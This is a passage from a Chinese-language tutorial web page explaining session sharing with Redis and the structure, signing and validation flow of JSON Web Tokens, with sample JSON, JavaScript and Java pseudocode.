</span><span id="__span-58-5"><a id="__codelineno-58-5" name="__codelineno-58-5" href="#__codelineno-58-5"></a>配置：
</span><span id="__span-58-6"><a id="__codelineno-58-6" name="__codelineno-58-6" href="#__codelineno-58-6"></a>spring.session.store-type=redis
</span><span id="__span-58-7"><a id="__codelineno-58-7" name="__codelineno-58-7" href="#__codelineno-58-7"></a>spring.redis.host=redis-cluster
</span><span id="__span-58-8"><a id="__codelineno-58-8" name="__codelineno-58-8" href="#__codelineno-58-8"></a>spring.session.timeout=30m
</span></code></pre></div></p>
<p><strong>场景3：跨子域Session共享</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>需求：
</span><span id="__span-59-2"><a id="__codelineno-59-2" name="__codelineno-59-2" href="#__codelineno-59-2"></a>- www.example.com
</span><span id="__span-59-3"><a id="__codelineno-59-3" name="__codelineno-59-3" href="#__codelineno-59-3"></a>- api.example.com
</span><span id="__span-59-4"><a id="__codelineno-59-4" name="__codelineno-59-4" href="#__codelineno-59-4"></a>- admin.example.com
</span><span id="__span-59-5"><a id="__codelineno-59-5" name="__codelineno-59-5" href="#__codelineno-59-5"></a>共享登录状态
</span><span id="__span-59-6"><a id="__codelineno-59-6" name="__codelineno-59-6" href="#__codelineno-59-6"></a>
</span><span id="__span-59-7"><a id="__codelineno-59-7" name="__codelineno-59-7" href="#__codelineno-59-7"></a>配置：
</span><span id="__span-59-8"><a id="__codelineno-59-8" name="__codelineno-59-8" href="#__codelineno-59-8"></a>Cookie域设置：.example.com
</span><span id="__span-59-9"><a id="__codelineno-59-9" name="__codelineno-59-9" href="#__codelineno-59-9"></a>Session存储：Redis（所有子域共享）
</span></code></pre></div></p>
<hr />
<h2 id="2-jwtjson-web-token详解">2. JWT（JSON Web Token）详解<a class="headerlink" href="#2-jwtjson-web-token详解" title="链接到此标题">&para;</a></h2>
<h3 id="21-jwt基础理论what--why">2.1 JWT基础理论（What &amp; Why）<a class="headerlink" href="#21-jwt基础理论what--why" title="链接到此标题">&para;</a></h3>
<p><strong>JWT是什么？</strong></p>
<p>JWT（JSON Web Token）是一种**开放标准（RFC 7519）**，定义了一种紧凑且自包含的方式，用于在各方之间安全地传输信息作为JSON对象。</p>
<p><strong>设计目标：</strong>
1. <strong>无状态</strong>：服务器不需要存储Session
2. <strong>可扩展</strong>：天然支持分布式和微服务
3. <strong>跨域</strong>：支持跨域身份验证
4. <strong>自包含</strong>：Token包含所有必要信息</p>
<p><strong>JWT vs 传统Session Token：</strong></p>
<table>
<thead>
<tr>
<th>特性</th>
<th>传统Session Token</th>
<th>JWT</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>存储位置</strong></td>
<td>服务器端</td>
<td>客户端</td>
</tr>
<tr>
<td><strong>Token内容</strong></td>
<td>随机字符串（引用）</td>
<td>JSON数据（自包含）</td>
</tr>
<tr>
<td><strong>验证方式</strong></td>
<td>查询存储</td>
<td>验证签名</td>
</tr>
<tr>
<td><strong>服务器状态</strong></td>
<td>有状态</td>
<td>无状态</td>
</tr>
<tr>
<td><strong>扩展性</strong></td>
<td>需要Session共享</td>
<td>天然支持分布式</td>
</tr>
<tr>
<td><strong>撤销能力</strong></td>
<td>容易（删除Session）</td>
<td>困难（需要黑名单）</td>
</tr>
<tr>
<td><strong>大小</strong></td>
<td>小（32-128字节）</td>
<td>大（通常&gt;200字节）</td>
</tr>
</tbody>
</table>
<h3 id="22-jwt结构详解structure">2.2 JWT结构详解（Structure）<a class="headerlink" href="#22-jwt结构详解structure" title="链接到此标题">&para;</a></h3>
<p>JWT由三部分组成，用点(<code>.</code>)分隔：</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>JWT = Header.Payload.Signature
</span></code></pre></div>
<p><strong>完整示例：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
</span></code></pre></div></p>
<h4 id="part-1-header头部">Part 1: Header（头部）<a class="headerlink" href="#part-1-header头部" title="链接到此标题">&para;</a></h4>
<p>**作用：**描述Token的元数据</p>
<p><strong>典型结构：</strong>
<div class="language-json highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a><span class="p">{</span>
</span><span id="__span-62-2"><a id="__codelineno-62-2" name="__codelineno-62-2" href="#__codelineno-62-2"></a><span class="w">  </span><span class="nt">&quot;alg&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;HS256&quot;</span><span class="p">,</span><span class="w">     </span><span class="c1">// 签名算法（Algorithm）</span>
</span><span id="__span-62-3"><a id="__codelineno-62-3" name="__codelineno-62-3" href="#__codelineno-62-3"></a><span class="w">  </span><span class="nt">&quot;typ&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;JWT&quot;</span><span class="w">        </span><span class="c1">// Token类型（Type）</span>
</span><span id="__span-62-4"><a id="__codelineno-62-4" name="__codelineno-62-4" href="#__codelineno-62-4"></a><span class="p">}</span>
</span></code></pre></div></p>
<p><strong>Base64URL编码后：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
</span></code></pre></div></p>
<p><strong>常用算法：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a>对称算法（HMAC）：
</span><span id="__span-64-2"><a id="__codelineno-64-2" name="__codelineno-64-2" href="#__codelineno-64-2"></a>- HS256: HMAC + SHA-256
</span><span id="__span-64-3"><a id="__codelineno-64-3" name="__codelineno-64-3" href="#__codelineno-64-3"></a>- HS384: HMAC + SHA-384
</span><span id="__span-64-4"><a id="__codelineno-64-4" name="__codelineno-64-4" href="#__codelineno-64-4"></a>- HS512: HMAC + SHA-512
</span><span id="__span-64-5"><a id="__codelineno-64-5" name="__codelineno-64-5" href="#__codelineno-64-5"></a>
</span><span id="__span-64-6"><a id="__codelineno-64-6" name="__codelineno-64-6" href="#__codelineno-64-6"></a>非对称算法（RSA/ECDSA）：
</span><span id="__span-64-7"><a id="__codelineno-64-7" name="__codelineno-64-7" href="#__codelineno-64-7"></a>- RS256: RSA + SHA-256
</span><span id="__span-64-8"><a id="__codelineno-64-8" name="__codelineno-64-8" href="#__codelineno-64-8"></a>- RS384: RSA + SHA-384
</span><span id="__span-64-9"><a id="__codelineno-64-9" name="__codelineno-64-9" href="#__codelineno-64-9"></a>- RS512: RSA + SHA-512
</span><span id="__span-64-10"><a id="__codelineno-64-10" name="__codelineno-64-10" href="#__codelineno-64-10"></a>- ES256: ECDSA + SHA-256
</span></code></pre></div></p>
<h4 id="part-2-payload载荷">Part 2: Payload（载荷）<a class="headerlink" href="#part-2-payload载荷" title="链接到此标题">&para;</a></h4>
<p>**作用：**存储实际数据（Claims）</p>
<p><strong>Payload结构：</strong>
<div class="language-json highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a><span class="p">{</span>
</span><span id="__span-65-2"><a id="__codelineno-65-2" name="__codelineno-65-2" href="#__codelineno-65-2"></a><span class="w">  </span><span class="c1">// 标准Claims（Registered Claims）</span>
</span><span id="__span-65-3"><a id="__codelineno-65-3" name="__codelineno-65-3" href="#__codelineno-65-3"></a><span class="w">  </span><span class="nt">&quot;iss&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://auth.example.com&quot;</span><span class="p">,</span><span class="w">  </span><span class="c1">// Issuer（签发者）</span>
</span><span id="__span-65-4"><a id="__codelineno-65-4" name="__codelineno-65-4" href="#__codelineno-65-4"></a><span class="w">  </span><span class="nt">&quot;sub&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;1234567890&quot;</span><span class="p">,</span><span class="w">                 </span><span class="c1">// Subject（主题，通常是用户ID）</span>
</span><span id="__span-65-5"><a id="__codelineno-65-5" name="__codelineno-65-5" href="#__codelineno-65-5"></a><span class="w">  </span><span class="nt">&quot;aud&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://api.example.com&quot;</span><span class="p">,</span><span class="w">    </span><span class="c1">// Audience（受众）</span>
</span><span id="__span-65-6"><a id="__codelineno-65-6" name="__codelineno-65-6" href="#__codelineno-65-6"></a><span class="w">  </span><span class="nt">&quot;exp&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1735689600</span><span class="p">,</span><span class="w">                   </span><span class="c1">// Expiration Time（过期时间，Unix时间戳）</span>
</span><span id="__span-65-7"><a id="__codelineno-65-7" name="__codelineno-65-7" href="#__codelineno-65-7"></a><span class="w">  </span><span class="nt">&quot;nbf&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1735686000</span><span class="p">,</span><span class="w">                   </span><span class="c1">// Not Before（生效时间）</span>
</span><span id="__span-65-8"><a id="__codelineno-65-8" name="__codelineno-65-8" href="#__codelineno-65-8"></a><span class="w">  </span><span class="nt">&quot;iat&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1735686000</span><span class="p">,</span><span class="w">                   </span><span class="c1">// Issued At（签发时间）</span>
</span><span id="__span-65-9"><a id="__codelineno-65-9" name="__codelineno-65-9" href="#__codelineno-65-9"></a><span class="w">  </span><span class="nt">&quot;jti&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;unique-token-id-123&quot;</span><span class="p">,</span><span class="w">        </span><span class="c1">// JWT ID（唯一标识符）</span>
</span><span id="__span-65-10"><a id="__codelineno-65-10" name="__codelineno-65-10" href="#__codelineno-65-10"></a>
</span><span id="__span-65-11"><a id="__codelineno-65-11" name="__codelineno-65-11" href="#__codelineno-65-11"></a><span class="w">  </span><span class="c1">// 自定义Claims（Private Claims）</span>
</span><span id="__span-65-12"><a id="__codelineno-65-12" name="__codelineno-65-12" href="#__codelineno-65-12"></a><span class="w">  </span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;zhangsan&quot;</span><span class="p">,</span>
</span><span id="__span-65-13"><a id="__codelineno-65-13" name="__codelineno-65-13" href="#__codelineno-65-13"></a><span class="w">  </span><span class="nt">&quot;roles&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;user&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;admin&quot;</span><span class="p">],</span>
</span><span id="__span-65-14"><a id="__codelineno-65-14" name="__codelineno-65-14" href="#__codelineno-65-14"></a><span class="w">  </span><span class="nt">&quot;permissions&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;read&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;write&quot;</span><span class="p">]</span>
</span><span id="__span-65-15"><a id="__codelineno-65-15" name="__codelineno-65-15" href="#__codelineno-65-15"></a><span class="p">}</span>
</span></code></pre></div></p>
<p><strong>Base64URL编码后：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a>eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ
</span></code></pre></div></p>
<p><strong>标准Claims详解：</strong></p>
<table>
<thead>
<tr>
<th>Claim</th>
<th>名称</th>
<th>说明</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>iss</strong></td>
<td>Issuer</td>
<td>Token签发者</td>
<td><code>"https://auth.example.com"</code></td>
</tr>
<tr>
<td><strong>sub</strong></td>
<td>Subject</td>
<td>Token主题（用户ID）</td>
<td><code>"user123"</code></td>
</tr>
<tr>
<td><strong>aud</strong></td>
<td>Audience</td>
<td>Token受众（谁可以使用）</td>
<td><code>"api.example.com"</code> 或 <code>["api", "web"]</code></td>
</tr>
<tr>
<td><strong>exp</strong></td>
<td>Expiration</td>
<td>过期时间（Unix时间戳）</td>
<td><code>1735689600</code> (2025-01-01 00:00)</td>
</tr>
<tr>
<td><strong>nbf</strong></td>
<td>Not Before</td>
<td>生效时间</td>
<td><code>1735686000</code></td>
</tr>
<tr>
<td><strong>iat</strong></td>
<td>Issued At</td>
<td>签发时间</td>
<td><code>1735686000</code></td>
</tr>
<tr>
<td><strong>jti</strong></td>
<td>JWT ID</td>
<td>Token唯一ID（防重放）</td>
<td><code>"abc-123-def"</code></td>
</tr>
</tbody>
</table>
<p><strong>⚠️ 重要提示：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a>Payload是Base64编码，不是加密！
</span><span id="__span-67-2"><a id="__codelineno-67-2" name="__codelineno-67-2" href="#__codelineno-67-2"></a>任何人都可以解码查看内容！
</span><span id="__span-67-3"><a id="__codelineno-67-3" name="__codelineno-67-3" href="#__codelineno-67-3"></a>❌ 不要在Payload中存放敏感信息（密码、信用卡号）
</span><span id="__span-67-4"><a id="__codelineno-67-4" name="__codelineno-67-4" href="#__codelineno-67-4"></a>✅ 只存放必要的身份和权限信息
</span></code></pre></div></p>
<h4 id="part-3-signature签名">Part 3: Signature（签名）<a class="headerlink" href="#part-3-signature签名" title="链接到此标题">&para;</a></h4>
<p>**作用：**验证Token完整性和真实性</p>
<p><strong>生成算法（以HS256为例）：</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a>signature = HMACSHA256(
</span><span id="__span-68-2"><a id="__codelineno-68-2" name="__codelineno-68-2" href="#__codelineno-68-2"></a>  base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload),
</span><span id="__span-68-3"><a id="__codelineno-68-3" name="__codelineno-68-3" href="#__codelineno-68-3"></a>  secret
</span><span id="__span-68-4"><a id="__codelineno-68-4" name="__codelineno-68-4" href="#__codelineno-68-4"></a>)
</span></code></pre></div></p>
<p><strong>完整示例：</strong>
<div class="language-javascript highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a><span class="c1">// 输入</span>
</span><span id="__span-69-2"><a id="__codelineno-69-2" name="__codelineno-69-2" href="#__codelineno-69-2"></a><span class="kd">const</span><span class="w"> </span><span class="nx">header</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;{&quot;alg&quot;:&quot;HS256&quot;,&quot;typ&quot;:&quot;JWT&quot;}&#39;</span><span class="p">;</span>
</span><span id="__span-69-3"><a id="__codelineno-69-3" name="__codelineno-69-3" href="#__codelineno-69-3"></a><span class="kd">const</span><span class="w"> </span><span class="nx">payload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;{&quot;sub&quot;:&quot;1234567890&quot;,&quot;name&quot;:&quot;John Doe&quot;,&quot;iat&quot;:1516239022}&#39;</span><span class="p">;</span>
</span><span id="__span-69-4"><a id="__codelineno-69-4" name="__codelineno-69-4" href="#__codelineno-69-4"></a><span class="kd">const</span><span class="w"> </span><span class="nx">secret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;my-256-bit-secret&#39;</span><span class="p">;</span>
</span><span id="__span-69-5"><a id="__codelineno-69-5" name="__codelineno-69-5" href="#__codelineno-69-5"></a>
</span><span id="__span-69-6"><a id="__codelineno-69-6" name="__codelineno-69-6" href="#__codelineno-69-6"></a><span class="c1">// 步骤1：Base64URL编码</span>
</span><span id="__span-69-7"><a id="__codelineno-69-7" name="__codelineno-69-7" href="#__codelineno-69-7"></a><span class="kd">const</span><span class="w"> </span><span class="nx">encodedHeader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">base64UrlEncode</span><span class="p">(</span><span class="nx">header</span><span class="p">);</span>
</span><span id="__span-69-8"><a id="__codelineno-69-8" name="__codelineno-69-8" href="#__codelineno-69-8"></a><span class="c1">// eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span>
</span><span id="__span-69-9"><a id="__codelineno-69-9" name="__codelineno-69-9" href="#__codelineno-69-9"></a>
</span><span id="__span-69-10"><a id="__codelineno-69-10" name="__codelineno-69-10" href="#__codelineno-69-10"></a><span class="kd">const</span><span class="w"> </span><span class="nx">encodedPayload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">base64UrlEncode</span><span class="p">(</span><span class="nx">payload</span><span class="p">);</span>
</span><span id="__span-69-11"><a id="__codelineno-69-11" name="__codelineno-69-11" href="#__codelineno-69-11"></a><span class="c1">// eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ</span>
</span><span id="__span-69-12"><a id="__codelineno-69-12" name="__codelineno-69-12" href="#__codelineno-69-12"></a>
</span><span id="__span-69-13"><a id="__codelineno-69-13" name="__codelineno-69-13" href="#__codelineno-69-13"></a><span class="c1">// 步骤2：拼接</span>
</span><span id="__span-69-14"><a id="__codelineno-69-14" name="__codelineno-69-14" href="#__codelineno-69-14"></a><span class="kd">const</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">encodedHeader</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;.&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">encodedPayload</span><span class="p">;</span>
</span><span id="__span-69-15"><a id="__codelineno-69-15" name="__codelineno-69-15" href="#__codelineno-69-15"></a>
</span><span id="__span-69-16"><a id="__codelineno-69-16" name="__codelineno-69-16" href="#__codelineno-69-16"></a><span class="c1">// 步骤3：签名</span>
</span><span id="__span-69-17"><a id="__codelineno-69-17" name="__codelineno-69-17" href="#__codelineno-69-17"></a><span class="kd">const</span><span class="w"> </span><span class="nx">signature</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">HMACSHA256</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span><span class="w"> </span><span class="nx">secret</span><span class="p">);</span>
</span><span id="__span-69-18"><a id="__codelineno-69-18" name="__codelineno-69-18" href="#__codelineno-69-18"></a><span class="c1">// SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span>
</span><span id="__span-69-19"><a id="__codelineno-69-19" name="__codelineno-69-19" href="#__codelineno-69-19"></a>
</span><span id="__span-69-20"><a id="__codelineno-69-20" name="__codelineno-69-20" href="#__codelineno-69-20"></a><span class="c1">// 步骤4：完整JWT</span>
</span><span id="__span-69-21"><a id="__codelineno-69-21" name="__codelineno-69-21" href="#__codelineno-69-21"></a><span class="kd">const</span><span class="w"> </span><span class="nx">jwt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;.&#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">base64UrlEncode</span><span class="p">(</span><span class="nx">signature</span><span class="p">);</span>
</span></code></pre></div></p>
<p><strong>签名的作用：</strong>
1. <strong>完整性验证</strong>：检测Token是否被篡改
2. <strong>真实性验证</strong>：确认Token由授权服务器签发
3. <strong>不可伪造</strong>：没有密钥无法伪造有效签名</p>
<h3 id="23-jwt工作流程workflow">2.3 JWT工作流程（Workflow）<a class="headerlink" href="#23-jwt工作流程workflow" title="链接到此标题">&para;</a></h3>
<p><strong>完整认证流程：</strong></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a>┌──────────┐                 ┌──────────┐                 ┌──────────┐
</span><span id="__span-70-2"><a id="__codelineno-70-2" name="__codelineno-70-2" href="#__codelineno-70-2"></a>│  客户端   │                 │ 认证服务器 │                 │ 资源服务器 │
</span><span id="__span-70-3"><a id="__codelineno-70-3" name="__codelineno-70-3" href="#__codelineno-70-3"></a>└────┬─────┘                 └────┬─────┘                 └────┬─────┘
</span><span id="__span-70-4"><a id="__codelineno-70-4" name="__codelineno-70-4" href="#__codelineno-70-4"></a>     │                            │                            │
</span><span id="__span-70-5"><a id="__codelineno-70-5" name="__codelineno-70-5" href="#__codelineno-70-5"></a>     │  1. POST /login            │                            │
</span><span id="__span-70-6"><a id="__codelineno-70-6" name="__codelineno-70-6" href="#__codelineno-70-6"></a>     │     username &amp; password    │                            │
</span><span id="__span-70-7"><a id="__codelineno-70-7" name="__codelineno-70-7" href="#__codelineno-70-7"></a>     ├───────────────────────────&gt;│                            │
</span><span id="__span-70-8"><a id="__codelineno-70-8" name="__codelineno-70-8" href="#__codelineno-70-8"></a>     │                            │                            │
</span><span id="__span-70-9"><a id="__codelineno-70-9" name="__codelineno-70-9" href="#__codelineno-70-9"></a>     │                            │  2. 验证凭证               │
</span><span id="__span-70-10"><a id="__codelineno-70-10" name="__codelineno-70-10" href="#__codelineno-70-10"></a>     │                            │  3. 生成JWT：              │
</span><span id="__span-70-11"><a id="__codelineno-70-11" name="__codelineno-70-11" href="#__codelineno-70-11"></a>     │                            │     - 创建Header           │
</span><span id="__span-70-12"><a id="__codelineno-70-12" name="__codelineno-70-12" href="#__codelineno-70-12"></a>     │                            │     - 创建Payload          │
</span><span id="__span-70-13"><a id="__codelineno-70-13" name="__codelineno-70-13" href="#__codelineno-70-13"></a>     │                            │     - 生成Signature        │
</span><span id="__span-70-14"><a id="__codelineno-70-14" name="__codelineno-70-14" href="#__codelineno-70-14"></a>     │                            │                            │
</span><span id="__span-70-15"><a id="__codelineno-70-15" name="__codelineno-70-15" href="#__codelineno-70-15"></a>     │  4. 返回JWT                │                            │
</span><span id="__span-70-16"><a id="__codelineno-70-16" name="__codelineno-70-16" href="#__codelineno-70-16"></a>     │     {                      │                            │
</span><span id="__span-70-17"><a id="__codelineno-70-17" name="__codelineno-70-17" href="#__codelineno-70-17"></a>     │       &quot;access_token&quot;: &quot;eyJ...&quot;,                         │
</span><span id="__span-70-18"><a id="__codelineno-70-18" name="__codelineno-70-18" href="#__codelineno-70-18"></a>     │       &quot;token_type&quot;: &quot;Bearer&quot;,                           │
</span><span id="__span-70-19"><a id="__codelineno-70-19" name="__codelineno-70-19" href="#__codelineno-70-19"></a>     │       &quot;expires_in&quot;: 3600    │                            │
</span><span id="__span-70-20"><a id="__codelineno-70-20" name="__codelineno-70-20" href="#__codelineno-70-20"></a>     │     }                       │                            │
</span><span id="__span-70-21"><a id="__codelineno-70-21" name="__codelineno-70-21" href="#__codelineno-70-21"></a>     │&lt;───────────────────────────┤                            │
</span><span id="__span-70-22"><a id="__codelineno-70-22" name="__codelineno-70-22" href="#__codelineno-70-22"></a>     │                            │                            │
</span><span id="__span-70-23"><a id="__codelineno-70-23" name="__codelineno-70-23" href="#__codelineno-70-23"></a>     │  5. 客户端保存Token        │                            │
</span><span id="__span-70-24"><a id="__codelineno-70-24" name="__codelineno-70-24" href="#__codelineno-70-24"></a>     │     localStorage.setItem(&#39;token&#39;, ...)                  │
</span><span id="__span-70-25"><a id="__codelineno-70-25" name="__codelineno-70-25" href="#__codelineno-70-25"></a>     │                            │                            │
</span><span id="__span-70-26"><a id="__codelineno-70-26" name="__codelineno-70-26" href="#__codelineno-70-26"></a>     │  6. GET /api/user/profile                               │
</span><span id="__span-70-27"><a id="__codelineno-70-27" name="__codelineno-70-27" href="#__codelineno-70-27"></a>     │     Authorization: Bearer eyJ...                        │
</span><span id="__span-70-28"><a id="__codelineno-70-28" name="__codelineno-70-28" href="#__codelineno-70-28"></a>     ├────────────────────────────────────────────────────────&gt;│
</span><span id="__span-70-29"><a id="__codelineno-70-29" name="__codelineno-70-29" href="#__codelineno-70-29"></a>     │                            │                            │
</span><span id="__span-70-30"><a id="__codelineno-70-30" name="__codelineno-70-30" href="#__codelineno-70-30"></a>     │                            │                            │  7. 提取Token
</span><span id="__span-70-31"><a id="__codelineno-70-31" name="__codelineno-70-31" href="#__codelineno-70-31"></a>     │                            │                            │  8. 验证Token：
</span><span id="__span-70-32"><a id="__codelineno-70-32" name="__codelineno-70-32" href="#__codelineno-70-32"></a>     │                            │                            │     - 解析Header
</span><span id="__span-70-33"><a id="__codelineno-70-33" name="__codelineno-70-33" href="#__codelineno-70-33"></a>     │                            │                            │     - 解析Payload
</span><span id="__span-70-34"><a id="__codelineno-70-34" name="__codelineno-70-34" href="#__codelineno-70-34"></a>     │                            │                            │     - 验证签名
</span><span id="__span-70-35"><a id="__codelineno-70-35" name="__codelineno-70-35" href="#__codelineno-70-35"></a>     │                            │                            │     - 检查过期时间
</span><span id="__span-70-36"><a id="__codelineno-70-36" name="__codelineno-70-36" href="#__codelineno-70-36"></a>     │                            │                            │  9. 提取用户信息
</span><span id="__span-70-37"><a id="__codelineno-70-37" name="__codelineno-70-37" href="#__codelineno-70-37"></a>     │                            │                            │  10. 执行业务逻辑
</span><span id="__span-70-38"><a id="__codelineno-70-38" name="__codelineno-70-38" href="#__codelineno-70-38"></a>     │                            │                            │
</span><span id="__span-70-39"><a id="__codelineno-70-39" name="__codelineno-70-39" href="#__codelineno-70-39"></a>     │  11. 返回用户数据                                        │
</span><span id="__span-70-40"><a id="__codelineno-70-40" name="__codelineno-70-40" href="#__codelineno-70-40"></a>     │&lt;────────────────────────────────────────────────────────┤
</span><span id="__span-70-41"><a id="__codelineno-70-41" name="__codelineno-70-41" href="#__codelineno-70-41"></a>     │                            │                            │
</span></code></pre></div>
<p><strong>Token验证详细步骤：</strong></p>
<div class="language-java highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a><span class="cm">/**</span>
</span><span id="__span-71-2"><a id="__codelineno-71-2" name="__codelineno-71-2" href="#__codelineno-71-2"></a><span class="cm"> * JWT验证伪代码</span>
</span><span id="__span-71-3"><a id="__codelineno-71-3" name="__codelineno-71-3" href="#__codelineno-71-3"></a><span class="cm"> */</span>
</span><span id="__span-71-4"><a id="__codelineno-71-4" name="__codelineno-71-4" href="#__codelineno-71-4"></a><span class="kd">public</span><span class="w"> </span><span class="n">User</span><span class="w"> </span><span class="nf">validateToken</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">jwt</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-71-5"><a id="__codelineno-71-5" name="__codelineno-71-5" href="#__codelineno-71-5"></a><span class="w">    </span><span class="c1">// 1. 分割JWT</span>
</span><span id="__span-71-6"><a id="__codelineno-71-6" name="__codelineno-71-6" href="#__codelineno-71-6"></a><span class="w">    </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">parts</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">jwt</span><span class="p">.</span><span class="na">split</span><span class="p">(</span><span class="s">&quot;\\.&quot;</span><span class="p">);</span>
</span><span id="__span-71-7"><a id="__codelineno-71-7" name="__codelineno-71-7" href="#__codelineno-71-7"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">parts</span><span class="p">.</span><span class="na">length</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">3</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-71-8"><a id="__codelineno-71-8" name="__codelineno-71-8" href="#__codelineno-71-8"></a><span class="w">        </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InvalidTokenException</span><span class="p">(</span><span class="s">&quot;Invalid JWT format&quot;</span><span class="p">);</span>
</span><span id="__span-71-9"><a id="__codelineno-71-9" name="__codelineno-71-9" href="#__codelineno-71-9"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-71-10"><a id="__codelineno-71-10" name="__codelineno-71-10" href="#__codelineno-71-10"></a>
</span><span id="__span-71-11"><a id="__codelineno-71-11" name="__codelineno-71-11" href="#__codelineno-71-11"></a><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">encodedHeader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">parts</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">;</span>
</span><span id="__span-71-12"><a id="__codelineno-71-12" name="__codelineno-71-12" href="#__codelineno-71-12"></a><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">encodedPayload</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">parts</span><span class="o">[</span><span class="mi">1</span><span class="o">]</span><span class="p">;</span>
</span><span id="__span-71-13"><a id="__codelineno-71-13" name="__codelineno-71-13" href="#__codelineno-71-13"></a><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">encodedSignature</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">parts</span><span class="o">[</span><span class="mi">2</span><span class="o">]</span><span class="p">;</span>
</span><span id="__span-71-14"><a id="__codelineno-71-14" name="__codelineno-71-14" href="#__codelineno-71-14"></a>
</span><span id="__span-71-15"><a id="__codelineno-71-15" name="__codelineno-71-15" href="#__codelineno-71-15"></a><span class="w">    </span><span class="c1">// 2. 解码Header</span>
